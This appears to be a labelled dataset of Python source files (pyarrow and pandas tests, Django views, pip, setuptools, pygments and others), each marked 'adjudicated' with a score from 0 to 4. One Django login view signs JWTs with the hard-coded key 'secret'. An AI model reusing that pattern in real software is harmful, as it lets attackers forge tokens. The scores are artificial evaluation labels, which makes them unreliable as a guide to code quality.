        :param omci_agent: (OmciAdapterAgent) OMCI Adapter agent
        :param device_id: (str) ONU Device ID
        """"""
        super(AdtnGetMdsTask, self).__init__(omci_agent, device_id)

        self.name = AdtnGetMdsTask.name
        self._device = omci_agent.get_device(device_id)
        self._omci_managed = False      # TODO: Look up capabilities/model number/check handler

    def perform_get_mds(self):
        """"""
        Get the 'mib_data_sync' attribute of the ONU
        """"""
        self.log.info('perform-get-mds')

        if self._omci_managed:
            return super(AdtnGetMdsTask, self).perform_get_mds()

        # Non-OMCI managed ADTN ONUs always return 0 for MDS, use the MIB
        # sync value and depend on an accelerated mib resync to do the
        # proper comparison

        self.deferred.callback(self._device.mib_synchronizer.mib_data_sync)
"
132	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

import weakref

import numpy as np

import pyarrow as pa
from pyarrow.lib import StringBuilder


def test_weakref():
    sbuilder = StringBuilder()
    wr = weakref.ref(sbuilder)
    assert wr() is not None
    del sbuilder
    assert wr() is None


def test_string_builder_append():
    sbuilder = StringBuilder()
    sbuilder.append(b""a byte string"")
    sbuilder.append(""a string"")
    sbuilder.append(np.nan)
    sbuilder.append(None)
    assert len(sbuilder) == 4
    assert sbuilder.null_count == 2
    arr = sbuilder.finish()
    assert len(sbuilder) == 0
    assert isinstance(arr, pa.Array)
    assert arr.null_count == 2
    assert arr.type == 'str'
    expected = [""a byte string"", ""a string"", None, None]
    assert arr.to_pylist() == expected


def test_string_builder_append_values():
    sbuilder = StringBuilder()
    sbuilder.append_values([np.nan, None, ""text"", None, ""other text""])
    assert sbuilder.null_count == 3
    arr = sbuilder.finish()
    assert arr.null_count == 3
    expected = [None, None, ""text"", None, ""other text""]
    assert arr.to_pylist() == expected


def test_string_builder_append_after_finish():
    sbuilder = StringBuilder()
    sbuilder.append_values([np.nan, None, ""text"", None, ""other text""])
    arr = sbuilder.finish()
    sbuilder.append(""No effect"")
    expected = [None, None, ""text"", None, ""other text""]
    assert arr.to_pylist() == expected"
23	adjudicated	3	"#
# Copyright (C) 2009-2020 the sqlparse authors and contributors
# <see AUTHORS file>
#
# This module is part of python-sqlparse and is released under
# the BSD License: https://opensource.org/licenses/BSD-3-Clause

""""""Parse SQL statements.""""""

# Setup namespace
from sqlparse import sql
from sqlparse import cli
from sqlparse import engine
from sqlparse import tokens
from sqlparse import filters
from sqlparse import formatter


__version__ = '0.4.3'
__all__ = ['engine', 'filters', 'formatter', 'sql', 'tokens', 'cli']


def parse(sql, encoding=None):
    """"""Parse sql and return a list of statements.

    :param sql: A string containing one or more SQL statements.
    :param encoding: The encoding of the statement (optional).
    :returns: A tuple of :class:`~sqlparse.sql.Statement` instances.
    """"""
    return tuple(parsestream(sql, encoding))


def parsestream(stream, encoding=None):
    """"""Parses sql statements from file-like object.

    :param stream: A file-like object.
    :param encoding: The encoding of the stream contents (optional).
    :returns: A generator of :class:`~sqlparse.sql.Statement` instances.
    """"""
    stack = engine.FilterStack()
    stack.enable_grouping()
    return stack.run(stream, encoding)


def format(sql, encoding=None, **options):
    """"""Format *sql* according to *options*.

    Available options are documented in :ref:`formatting`.

    In addition to the formatting options this function accepts the
    keyword ""encoding"" which determines the encoding of the statement.

    :returns: The formatted SQL statement as string.
    """"""
    stack = engine.FilterStack()
    options = formatter.validate_options(options)
    stack = formatter.build_filter_stack(stack, options)
    stack.postprocess.append(filters.SerializerUnicode())
    return ''.join(stack.run(sql, encoding))


def split(sql, encoding=None):
    """"""Split *sql* into single statements.

    :param sql: A string containing one or more SQL statements.
    :param encoding: The encoding of the statement (optional).
    :returns: A list of strings.
    """"""
    stack = engine.FilterStack()
    return [str(stmt).strip() for stmt in stack.run(sql, encoding)]"
163	adjudicated	0	"from __future__ import annotations

from typing import TYPE_CHECKING

from components.base_component import BaseComponent

if TYPE_CHECKING:
    from entity import Actor


class Level(BaseComponent):
    parent: Actor

    def __init__(
        self,
        current_level: int = 1,
        current_xp: int = 0,
        level_up_base: int = 0,
        level_up_factor: int = 150,
        xp_given: int = 0,
    ):
        self.current_level = current_level
        self.current_xp = current_xp
        self.level_up_base = level_up_base
        self.level_up_factor = level_up_factor
        self.xp_given = xp_given

    @property
    def experience_to_next_level(self) -> int:
        return self.level_up_base + self.current_level * self.level_up_factor

    @property
    def requires_level_up(self) -> bool:
        return self.current_xp > self.experience_to_next_level

    def add_xp(self, xp: int) -> None:
        if xp == 0 or self.level_up_base == 0:
            return

        self.current_xp += xp

        self.engine.message_log.add_message(f""You gain {xp} experience points."")

        if self.requires_level_up:
            self.engine.message_log.add_message(
                f""You advance to level {self.current_level + 1}!""
            )

    def increase_level(self) -> None:
        self.current_xp -= self.experience_to_next_level

        self.current_level += 1

    def increase_max_hp(self, amount: int = 20) -> None:
        self.parent.fighter.max_hp += amount
        self.parent.fighter.hp += amount

        self.engine.message_log.add_message(""Your health improves!"")

        self.increase_level()

    def increase_power(self, amount: int = 1) -> None:
        self.parent.fighter.base_power += amount

        self.engine.message_log.add_message(""You feel stronger!"")

        self.increase_level()

    def increase_defense(self, amount: int = 1) -> None:
        self.parent.fighter.base_defense += amount

        self.engine.message_log.add_message(""Your movements are getting swifter!"")

        self.increase_level()"
341	adjudicated	2	"from django.db import models
from django.contrib.auth.models import User
from io import BytesIO
import sys
print(sys.path)
from PIL import Image
from django.core.files.uploadedfile import InMemoryUploadedFile


# Create your models here.

class Blog_Post(models.Model, object):
    image = models.ImageField(blank= True, upload_to='get_upload_file_name')
    title = models.CharField(blank=True, max_length = 100)
    summary = models.TextField(blank= True, max_length =30)
    body = models.TextField(blank=True)
    slug = models.SlugField( unique=True)
    writer = models.ForeignKey(User,on_delete= models.CASCADE)
    created_on = models.DateTimeField(auto_now_add=True)

    def __str__(self) -> str:
        return self.title
    def save(self):
        # Opening the uploaded image
        im = Image.open(self.image)

        output = BytesIO()

        # Resize/modify the image
        im = im.resize((1024, 720))

        # after modifications, save it to the output
        im.save(output, format='png', quality=300)
        output.seek(0)

        # change the imagefield value to be the newley modifed image value
        self.image = InMemoryUploadedFile(output, 'ImageField', ""%s.webp"" % self.image.name.split('.')[0], 'image/webp',
                                        sys.getsizeof(output), None)

        super(Blog_Post, self).save()

class Comment(models.Model):
        commenter = models.CharField(max_length=15)
        body = models.TextField(max_length=30, blank=True)
        post = models.ForeignKey(Blog_Post, on_delete=models.CASCADE, related_name='comments')
        date = models.DateField(auto_now_add=True)
        like = models.BooleanField(default=True)
        def __str__(self) -> str:
             return self.commenter



class Meta:
    ordering = ('-created_at',)

   "
190	adjudicated	2	"import logging

""""""
_logging.py
websocket - WebSocket client library for Python

Copyright 2022 engn33r

Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
""""""

_logger = logging.getLogger('websocket')
try:
    from logging import NullHandler
except ImportError:
    class NullHandler(logging.Handler):
        def emit(self, record):
            pass

_logger.addHandler(NullHandler())

_traceEnabled = False

__all__ = [""enableTrace"", ""dump"", ""error"", ""warning"", ""debug"", ""trace"",
           ""isEnabledForError"", ""isEnabledForDebug"", ""isEnabledForTrace""]


def enableTrace(traceable, handler=logging.StreamHandler(), level=""DEBUG""):
    """"""
    Turn on/off the traceability.

    Parameters
    ----------
    traceable: bool
        If set to True, traceability is enabled.
    """"""
    global _traceEnabled
    _traceEnabled = traceable
    if traceable:
        _logger.addHandler(handler)
        _logger.setLevel(getattr(logging, level))


def dump(title, message):
    if _traceEnabled:
        _logger.debug(""--- "" + title + "" ---"")
        _logger.debug(message)
        _logger.debug(""-----------------------"")


def error(msg):
    _logger.error(msg)


def warning(msg):
    _logger.warning(msg)


def debug(msg):
    _logger.debug(msg)


def info(msg):
    _logger.info(msg)


def trace(msg):
    if _traceEnabled:
        _logger.debug(msg)


def isEnabledForError():
    return _logger.isEnabledFor(logging.ERROR)


def isEnabledForDebug():
    return _logger.isEnabledFor(logging.DEBUG)


def isEnabledForTrace():
    return _traceEnabled"
201	adjudicated	1	"import re

import pytest

import pandas._testing as tm

from pandas.io.excel import ExcelWriter

odf = pytest.importorskip(""odf"")

pytestmark = pytest.mark.parametrize(""ext"", ["".ods""])


def test_write_append_mode_raises(ext):
    msg = ""Append mode is not supported with odf!""

    with tm.ensure_clean(ext) as f:
        with pytest.raises(ValueError, match=msg):
            ExcelWriter(f, engine=""odf"", mode=""a"")


def test_kwargs(ext):
    # GH 42286
    # GH 43445
    # test for error: OpenDocumentSpreadsheet does not accept any arguments
    kwargs = {""kwarg"": 1}
    with tm.ensure_clean(ext) as f:
        msg = re.escape(""Use of **kwargs is deprecated"")
        error = re.escape(
            ""OpenDocumentSpreadsheet() got an unexpected keyword argument 'kwarg'""
        )
        with pytest.raises(
            TypeError,
            match=error,
        ):
            with tm.assert_produces_warning(FutureWarning, match=msg):
                with ExcelWriter(f, engine=""odf"", **kwargs) as _:
                    pass


@pytest.mark.parametrize(""engine_kwargs"", [None, {""kwarg"": 1}])
def test_engine_kwargs(ext, engine_kwargs):
    # GH 42286
    # GH 43445
    # test for error: OpenDocumentSpreadsheet does not accept any arguments
    with tm.ensure_clean(ext) as f:
        if engine_kwargs is not None:
            error = re.escape(
                ""OpenDocumentSpreadsheet() got an unexpected keyword argument 'kwarg'""
            )
            with pytest.raises(
                TypeError,
                match=error,
            ):
                ExcelWriter(f, engine=""odf"", engine_kwargs=engine_kwargs)
        else:
            with ExcelWriter(f, engine=""odf"", engine_kwargs=engine_kwargs) as _:
                pass


def test_book_and_sheets_consistent(ext):
    # GH#45687 - Ensure sheets is updated if user modifies book
    with tm.ensure_clean(ext) as f:
        with ExcelWriter(f) as writer:
            assert writer.sheets == {}
            table = odf.table.Table(name=""test_name"")
            writer.book.spreadsheet.addElement(table)
            assert writer.sheets == {""test_name"": table}"
81	adjudicated	0	"from django.contrib.messages.views import SuccessMessageMixin
from django.views.generic import CreateView, ListView, UpdateView, DeleteView
from django.urls import reverse_lazy
from .forms import HouseForm
from .mixins import CountFlatsMixin, ImageResizeBeforeMixin
from .models import House
from django.utils.translation import gettext_lazy as _
from ..mixins import LoginRequiredMixinCustom


class HouseCreateView(LoginRequiredMixinCustom, ImageResizeBeforeMixin,
                      SuccessMessageMixin, CreateView):
    form_class = HouseForm
    template_name = ""house/create.html""
    success_url = reverse_lazy('house_list')
    extra_context = {
        'header': _('Create house'),
        'button_title': _('Create'),
        'langs': House.get_lang_list_qs(),
    }
    success_message = _('House created successfully')


class HouseUpdateView(LoginRequiredMixinCustom, ImageResizeBeforeMixin,
                      SuccessMessageMixin, UpdateView):
    model = House
    form_class = HouseForm
    template_name = ""house/create.html""
    success_url = reverse_lazy('house_list')
    extra_context = {
        'header': _('Update house'),
        'button_title': _('Update'),
        'langs': House.get_lang_list_qs(),
    }
    success_message = _('House updated successfully')


class HouseListView(LoginRequiredMixinCustom, CountFlatsMixin, ListView):
    model = House
    template_name = ""house/list.html""
    extra_context = {
        'remove_title': _('remove'),
    }
    ordering = 'address'


class HouseDeleteView(LoginRequiredMixinCustom,
                      SuccessMessageMixin, DeleteView):
    model = House
    template_name = ""house/delete.html""
    success_url = reverse_lazy('house_list')
    extra_context = {
        'header': _('Remove house'),
        'button_title': _('Remove '),
        'message': _('Are you sure delete house '),
    }
    success_message = _('House deleted successfully')"
310	adjudicated	1	"from datetime import datetime

import pytest

from pandas._libs import tslib


@pytest.mark.parametrize(
    ""date_str, exp"",
    [
        (""2011-01-02"", datetime(2011, 1, 2)),
        (""2011-1-2"", datetime(2011, 1, 2)),
        (""2011-01"", datetime(2011, 1, 1)),
        (""2011-1"", datetime(2011, 1, 1)),
        (""2011 01 02"", datetime(2011, 1, 2)),
        (""2011.01.02"", datetime(2011, 1, 2)),
        (""2011/01/02"", datetime(2011, 1, 2)),
        (""2011\\01\\02"", datetime(2011, 1, 2)),
        (""2013-01-01 05:30:00"", datetime(2013, 1, 1, 5, 30)),
        (""2013-1-1 5:30:00"", datetime(2013, 1, 1, 5, 30)),
    ],
)
def test_parsers_iso8601(date_str, exp):
    # see gh-12060
    #
    # Test only the ISO parser - flexibility to
    # different separators and leading zero's.
    actual = tslib._test_parse_iso8601(date_str)
    assert actual == exp


@pytest.mark.parametrize(
    ""date_str"",
    [
        ""2011-01/02"",
        ""2011=11=11"",
        ""201401"",
        ""201111"",
        ""200101"",
        # Mixed separated and unseparated.
        ""2005-0101"",
        ""200501-01"",
        ""20010101 12:3456"",
        ""20010101 1234:56"",
        # HHMMSS must have two digits in
        # each component if unseparated.
        ""20010101 1"",
        ""20010101 123"",
        ""20010101 12345"",
        ""20010101 12345Z"",
    ],
)
def test_parsers_iso8601_invalid(date_str):
    msg = f'Error parsing datetime string ""{date_str}""'

    with pytest.raises(ValueError, match=msg):
        tslib._test_parse_iso8601(date_str)


def test_parsers_iso8601_invalid_offset_invalid():
    date_str = ""2001-01-01 12-34-56""
    msg = f'Timezone hours offset out of range in datetime string ""{date_str}""'

    with pytest.raises(ValueError, match=msg):
        tslib._test_parse_iso8601(date_str)


def test_parsers_iso8601_leading_space():
    # GH#25895 make sure isoparser doesn't overflow with long input
    date_str, expected = (""2013-1-1 5:30:00"", datetime(2013, 1, 1, 5, 30))
    actual = tslib._test_parse_iso8601("" "" * 200 + date_str)
    assert actual == expected"
250	adjudicated	0	"""""""Text field.""""""

import gws
import gws.base.database.sql as sql
import gws.base.database.model
import gws.types as t

from .. import scalar

gws.ext.new.modelField('text')


class SearchType(t.Enum):
    exact = 'exact'
    begin = 'begin'
    end = 'end'
    any = 'any'
    like = 'like'


class Search(gws.Data):
    type: SearchType
    minLength: int
    caseSensitive: bool


class SearchConfig(gws.Config):
    type: SearchType
    minLength: int = 0
    caseSensitive: bool = False


class Config(scalar.Config):
    textSearch: t.Optional[SearchConfig]


class Props(scalar.Props):
    pass


class Object(scalar.Object):
    attributeType = gws.AttributeType.str
    textSearch: t.Optional[Search]

    def configure(self):
        self.textSearch = None
        p = self.var('textSearch')
        if p:
            self.textSearch = Search(
                type=p.get('type', SearchType.exact),
                minLength=p.get('minLength', 0),
                caseSensitive=p.get('caseSensitive', False),
            )

    def sa_select(self, sel, user):
        sel = t.cast(sql.SelectStatement, sel)

        if not self.textSearch or not sel.search or not sel.search.keyword:
            return

        kw = sel.search.keyword
        so = self.textSearch
        if so.minLength and len(kw) < so.minLength:
            return

        mod = t.cast(gws.base.database.model.Object, self.model)
        fld = sql.sa.sql.cast(
            getattr(mod.sa_class(), self.name),
            sql.sa.String)

        if so.type == SearchType.exact:
            sel.keywordWhere.append(fld == kw)
        else:
            kw = sql.escape_like(kw)
            if so.type == 'any':
                kw = '%' + kw + '%'
            if so.type == 'begin':
                kw = kw + '%'
            if so.type == 'end':
                kw = '%' + kw

            if so.caseSensitive:
                sel.keywordWhere.append(fld.like(kw, escape='\\'))
            else:
                sel.keywordWhere.append(fld.ilike(kw, escape='\\'))"
471	adjudicated	2	"""""""Metadata generation logic for legacy source distributions.
""""""

import logging
import os

from pip._internal.build_env import BuildEnvironment
from pip._internal.exceptions import InstallationError
from pip._internal.utils.setuptools_build import make_setuptools_egg_info_args
from pip._internal.utils.subprocess import call_subprocess
from pip._internal.utils.temp_dir import TempDirectory

logger = logging.getLogger(__name__)


def _find_egg_info(directory):
    # type: (str) -> str
    """"""Find an .egg-info subdirectory in `directory`.
    """"""
    filenames = [
        f for f in os.listdir(directory) if f.endswith("".egg-info"")
    ]

    if not filenames:
        raise InstallationError(
            f""No .egg-info directory found in {directory}""
        )

    if len(filenames) > 1:
        raise InstallationError(
            ""More than one .egg-info directory found in {}"".format(
                directory
            )
        )

    return os.path.join(directory, filenames[0])


def generate_metadata(
    build_env,  # type: BuildEnvironment
    setup_py_path,  # type: str
    source_dir,  # type: str
    isolated,  # type: bool
    details,  # type: str
):
    # type: (...) -> str
    """"""Generate metadata using setup.py-based defacto mechanisms.

    Returns the generated metadata directory.
    """"""
    logger.debug(
        'Running setup.py (path:%s) egg_info for package %s',
        setup_py_path, details,
    )

    egg_info_dir = TempDirectory(
        kind=""pip-egg-info"", globally_managed=True
    ).path

    args = make_setuptools_egg_info_args(
        setup_py_path,
        egg_info_dir=egg_info_dir,
        no_user_config=isolated,
    )

    with build_env:
        call_subprocess(
            args,
            cwd=source_dir,
            command_desc='python setup.py egg_info',
        )

    # Return the .egg-info directory.
    return _find_egg_info(egg_info_dir)"
420	adjudicated	1	"from distutils.util import convert_path
from distutils import log
from distutils.errors import DistutilsOptionError
import os
import shutil

from setuptools import Command


class rotate(Command):
    """"""Delete older distributions""""""

    description = ""delete older distributions, keeping N newest files""
    user_options = [
        ('match=', 'm', ""patterns to match (required)""),
        ('dist-dir=', 'd', ""directory where the distributions are""),
        ('keep=', 'k', ""number of matching distributions to keep""),
    ]

    boolean_options = []

    def initialize_options(self):
        self.match = None
        self.dist_dir = None
        self.keep = None

    def finalize_options(self):
        if self.match is None:
            raise DistutilsOptionError(
                ""Must specify one or more (comma-separated) match patterns ""
                ""(e.g. '.zip' or '.egg')""
            )
        if self.keep is None:
            raise DistutilsOptionError(""Must specify number of files to keep"")
        try:
            self.keep = int(self.keep)
        except ValueError as e:
            raise DistutilsOptionError(""--keep must be an integer"") from e
        if isinstance(self.match, str):
            self.match = [
                convert_path(p.strip()) for p in self.match.split(',')
            ]
        self.set_undefined_options('bdist', ('dist_dir', 'dist_dir'))

    def run(self):
        self.run_command(""egg_info"")
        from glob import glob

        for pattern in self.match:
            pattern = self.distribution.get_name() + '*' + pattern
            files = glob(os.path.join(self.dist_dir, pattern))
            files = [(os.path.getmtime(f), f) for f in files]
            files.sort()
            files.reverse()

            log.info(""%d file(s) matching %s"", len(files), pattern)
            files = files[self.keep:]
            for (t, f) in files:
                log.info(""Deleting %s"", f)
                if not self.dry_run:
                    if os.path.isdir(f):
                        shutil.rmtree(f)
                    else:
                        os.unlink(f)"
482	adjudicated	3	"from urllib.parse import unquote, urlparse

from asgiref.testing import ApplicationCommunicator


class HttpCommunicator(ApplicationCommunicator):
    """"""
    ApplicationCommunicator subclass that has HTTP shortcut methods.

    It will construct the scope for you, so you need to pass the application
    (uninstantiated) along with HTTP parameters.

    This does not support full chunking - for that, just use ApplicationCommunicator
    directly.
    """"""

    def __init__(self, application, method, path, body=b"""", headers=None):
        parsed = urlparse(path)
        self.scope = {
            ""type"": ""http"",
            ""http_version"": ""1.1"",
            ""method"": method.upper(),
            ""path"": unquote(parsed.path),
            ""query_string"": parsed.query.encode(""utf-8""),
            ""headers"": headers or [],
        }
        assert isinstance(body, bytes)
        self.body = body
        self.sent_request = False
        super().__init__(application, self.scope)

    async def get_response(self, timeout=1):
        """"""
        Get the application's response. Returns a dict with keys of
        ""body"", ""headers"" and ""status"".
        """"""
        # If we've not sent the request yet, do so
        if not self.sent_request:
            self.sent_request = True
            await self.send_input({""type"": ""http.request"", ""body"": self.body})
        # Get the response start
        response_start = await self.receive_output(timeout)
        assert response_start[""type""] == ""http.response.start""
        # Get all body parts
        response_start[""body""] = b""""
        while True:
            chunk = await self.receive_output(timeout)
            assert chunk[""type""] == ""http.response.body""
            assert isinstance(chunk[""body""], bytes)
            response_start[""body""] += chunk[""body""]
            if not chunk.get(""more_body"", False):
                break
        # Return structured info
        del response_start[""type""]
        response_start.setdefault(""headers"", [])
        return response_start"
414	adjudicated	3	"# -*- coding: utf-8 -*-
#
# Copyright (C) 2019 Radim Rehurek <me@radimrehurek.com>
#
# This code is distributed under the terms and conditions
# from the MIT License (MIT).
#

""""""
Utilities for streaming to/from several file-like data storages: S3 / HDFS / local
filesystem / compressed files, and many more, using a simple, Pythonic API.

The streaming makes heavy use of generators and pipes, to avoid loading
full file contents into memory, allowing work with arbitrarily large files.

The main functions are:

* `open()`, which opens the given file for reading/writing
* `parse_uri()`
* `s3_iter_bucket()`, which goes over all keys in an S3 bucket in parallel
* `register_compressor()`, which registers callbacks for transparent compressor handling

""""""

import logging

#
# Prevent regression of #474 and #475
#
logger = logging.getLogger(__name__)
logger.addHandler(logging.NullHandler())

from smart_open import version  # noqa: E402
from .smart_open_lib import open, parse_uri, smart_open, register_compressor  # noqa: E402

_WARNING = """"""smart_open.s3_iter_bucket is deprecated and will stop functioning
in a future version. Please import iter_bucket from the smart_open.s3 module instead:

    from smart_open.s3 import iter_bucket as s3_iter_bucket

""""""
_WARNED = False


def s3_iter_bucket(
        bucket_name,
        prefix='',
        accept_key=None,
        key_limit=None,
        workers=16,
        retries=3,
        **session_kwargs
):
    """"""Deprecated.  Use smart_open.s3.iter_bucket instead.""""""
    global _WARNED
    from .s3 import iter_bucket
    if not _WARNED:
        logger.warning(_WARNING)
        _WARNED = True
    return iter_bucket(
        bucket_name=bucket_name,
        prefix=prefix,
        accept_key=accept_key,
        key_limit=key_limit,
        workers=workers,
        retries=retries,
        session_kwargs=session_kwargs
    )


__all__ = [
    'open',
    'parse_uri',
    'register_compressor',
    's3_iter_bucket',
    'smart_open',
]

__version__ = version.__version__"
505	adjudicated	3	"""""""
    pygments.styles.vim
    ~~~~~~~~~~~~~~~~~~~

    A highlighting style for Pygments, inspired by vim.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace, Token


class VimStyle(Style):
    """"""
    Styles somewhat like vim 7.0
    """"""

    background_color = ""#000000""
    highlight_color = ""#222222""

    styles = {
        Token:                     ""#cccccc"",
        Whitespace:                """",
        Comment:                   ""#000080"",
        Comment.Preproc:           """",
        Comment.Special:           ""bold #cd0000"",

        Keyword:                   ""#cdcd00"",
        Keyword.Declaration:       ""#00cd00"",
        Keyword.Namespace:         ""#cd00cd"",
        Keyword.Pseudo:            """",
        Keyword.Type:              ""#00cd00"",

        Operator:                  ""#3399cc"",
        Operator.Word:             ""#cdcd00"",

        Name:                      """",
        Name.Class:                ""#00cdcd"",
        Name.Builtin:              ""#cd00cd"",
        Name.Exception:            ""bold #666699"",
        Name.Variable:             ""#00cdcd"",

        String:                    ""#cd0000"",
        Number:                    ""#cd00cd"",

        Generic.Heading:           ""bold #000080"",
        Generic.Subheading:        ""bold #800080"",
        Generic.Deleted:           ""#cd0000"",
        Generic.Inserted:          ""#00cd00"",
        Generic.Error:             ""#FF0000"",
        Generic.Emph:              ""italic"",
        Generic.Strong:            ""bold"",
        Generic.Prompt:            ""bold #000080"",
        Generic.Output:            ""#888"",
        Generic.Traceback:         ""#04D"",

        Error:                     ""border:#FF0000""
    }"
445	adjudicated	0	"from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.exceptions import AuthenticationFailed
from rest_framework.parsers import JSONParser
from .serializers import UserSerializer
from .models import User
import jwt
import datetime
from jwt import decode
from bson.objectid import ObjectId

import sys

from helpers.permissions import isUser

class RegisterView(APIView):
    def post(self, request):
        serializer = UserSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        serializer.save()
        return Response(serializer.data)


class LoginView(APIView):
    def post(self, request):
        email = request.data['email']
        password = request.data['password']

        user = User.objects.filter(email__exact=email).first()

        if user is None:
            raise AuthenticationFailed('User not found!')

        if not user.check_password(password):
            raise AuthenticationFailed('Incorrect password!')

        payload = {
            'id': str(user._id),
            'admin': user.is_superAdmin,
            'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=60),
            'iat': datetime.datetime.utcnow()
        }
        

        token = jwt.encode(payload, 'secret',
                           algorithm='HS256').decode('utf-8')

        response = Response()

        response.set_cookie(key='jwt', value=token, httponly=True)
        response.data = {
            'jwt': token
        }

        return response


class UserView(APIView):
    
    permission_classes = [isUser]

    def get(self, request):
        user = User.objects.filter(_id=ObjectId(request.account['id'])).first()
        serializer = UserSerializer(user)
        
        return Response(serializer.data)



class LogoutView(APIView):
    def post(self, request):
        response = Response()
        response.delete_cookie('jwt')
        response.data = {
            'message': 'success'
        }
        return response"
178	adjudicated	4	"""""""For neatly implementing static typing in packaging.

`mypy` - the static type analysis tool we use - uses the `typing` module, which
provides core functionality fundamental to mypy's functioning.

Generally, `typing` would be imported at runtime and used in that fashion -
it acts as a no-op at runtime and does not have any run-time overhead by
design.

As it turns out, `typing` is not vendorable - it uses separate sources for
Python 2/Python 3. Thus, this codebase can not expect it to be present.
To work around this, mypy allows the typing import to be behind a False-y
optional to prevent it from running at runtime and type-comments can be used
to remove the need for the types to be accessible directly during runtime.

This module provides the False-y guard in a nicely named fashion so that a
curious maintainer can reach here to read this.

In packaging, all static-typing related imports should be guarded as follows:

    from packaging._typing import TYPE_CHECKING

    if TYPE_CHECKING:
        from typing import ...

Ref: https://github.com/python/mypy/issues/3216
""""""

__all__ = [""TYPE_CHECKING"", ""cast""]

# The TYPE_CHECKING constant defined by the typing module is False at runtime
# but True while type checking.
if False:  # pragma: no cover
    from typing import TYPE_CHECKING
else:
    TYPE_CHECKING = False

# typing's cast syntax requires calling typing.cast at runtime, but we don't
# want to import typing at runtime. Here, we inform the type checkers that
# we're importing `typing.cast` as `cast` and re-implement typing.cast's
# runtime behavior in a block that is ignored by type checkers.
if TYPE_CHECKING:  # pragma: no cover
    # not executed at runtime
    from typing import cast
else:
    # executed at runtime
    def cast(type_, value):  # noqa
        return value"
38	adjudicated	2	"from django.apps import apps
from django.conf import settings
from django.contrib.redirects.models import Redirect
from django.contrib.sites.shortcuts import get_current_site
from django.core.exceptions import ImproperlyConfigured
from django.http import HttpResponseGone, HttpResponsePermanentRedirect
from django.utils.deprecation import MiddlewareMixin


class RedirectFallbackMiddleware(MiddlewareMixin):
    # Defined as class-level attributes to be subclassing-friendly.
    response_gone_class = HttpResponseGone
    response_redirect_class = HttpResponsePermanentRedirect

    def __init__(self, get_response):
        if not apps.is_installed(""django.contrib.sites""):
            raise ImproperlyConfigured(
                ""You cannot use RedirectFallbackMiddleware when ""
                ""django.contrib.sites is not installed.""
            )
        super().__init__(get_response)

    def process_response(self, request, response):
        # No need to check for a redirect for non-404 responses.
        if response.status_code != 404:
            return response

        full_path = request.get_full_path()
        current_site = get_current_site(request)

        r = None
        try:
            r = Redirect.objects.get(site=current_site, old_path=full_path)
        except Redirect.DoesNotExist:
            pass
        if r is None and settings.APPEND_SLASH and not request.path.endswith(""/""):
            try:
                r = Redirect.objects.get(
                    site=current_site,
                    old_path=request.get_full_path(force_append_slash=True),
                )
            except Redirect.DoesNotExist:
                pass
        if r is not None:
            if r.new_path == """":
                return self.response_gone_class()
            return self.response_redirect_class(r.new_path)

        # No redirect was found. Return the response.
        return response"
129	adjudicated	4	"from rx.core import Observable, AnonymousObservable
from rx.disposables import CompositeDisposable
from rx.concurrency import timeout_scheduler
from rx.internal import extensionmethod


def sample_observable(source, sampler):

    def subscribe(observer):
        at_end = [None]
        has_value = [None]
        value = [None]

        def sample_subscribe(x=None):
            if has_value[0]:
                has_value[0] = False
                observer.on_next(value[0])

            if at_end[0]:
                observer.on_completed()

        def on_next(new_value):
            has_value[0] = True
            value[0] = new_value

        def on_completed():
            at_end[0] = True

        return CompositeDisposable(
            source.subscribe(on_next, observer.on_error, on_completed),
            sampler.subscribe(sample_subscribe, observer.on_error, sample_subscribe)
        )
    return AnonymousObservable(subscribe)


@extensionmethod(Observable, alias=""throttle_last"")
def sample(self, interval=None, sampler=None, scheduler=None):
    """"""Samples the observable sequence at each interval.

    1 - res = source.sample(sample_observable) # Sampler tick sequence
    2 - res = source.sample(5000) # 5 seconds
    2 - res = source.sample(5000, rx.scheduler.timeout) # 5 seconds

    Keyword arguments:
    source -- Source sequence to sample.
    interval -- Interval at which to sample (specified as an integer
        denoting milliseconds).
    scheduler -- [Optional] Scheduler to run the sampling timer on. If not
        specified, the timeout scheduler is used.

    Returns sampled observable sequence.
    """"""

    scheduler = scheduler or timeout_scheduler
    if interval is not None:
        return sample_observable(self, Observable.interval(interval, scheduler=scheduler))

    return sample_observable(self, sampler)"
69	adjudicated	3	"from importlib import import_module

from django.utils.version import get_docs_version


def deconstructible(*args, path=None):
    """"""
    Class decorator that allows the decorated class to be serialized
    by the migrations subsystem.

    The `path` kwarg specifies the import path.
    """"""
    def decorator(klass):
        def __new__(cls, *args, **kwargs):
            # We capture the arguments to make returning them trivial
            obj = super(klass, cls).__new__(cls)
            obj._constructor_args = (args, kwargs)
            return obj

        def deconstruct(obj):
            """"""
            Return a 3-tuple of class import path, positional arguments,
            and keyword arguments.
            """"""
            # Fallback version
            if path:
                module_name, _, name = path.rpartition('.')
            else:
                module_name = obj.__module__
                name = obj.__class__.__name__
            # Make sure it's actually there and not an inner class
            module = import_module(module_name)
            if not hasattr(module, name):
                raise ValueError(
                    ""Could not find object %s in %s.\n""
                    ""Please note that you cannot serialize things like inner ""
                    ""classes. Please move the object into the main module ""
                    ""body to use migrations.\n""
                    ""For more information, see ""
                    ""https://docs.djangoproject.com/en/%s/topics/migrations/#serializing-values""
                    % (name, module_name, get_docs_version()))
            return (
                path or '%s.%s' % (obj.__class__.__module__, name),
                obj._constructor_args[0],
                obj._constructor_args[1],
            )

        klass.__new__ = staticmethod(__new__)
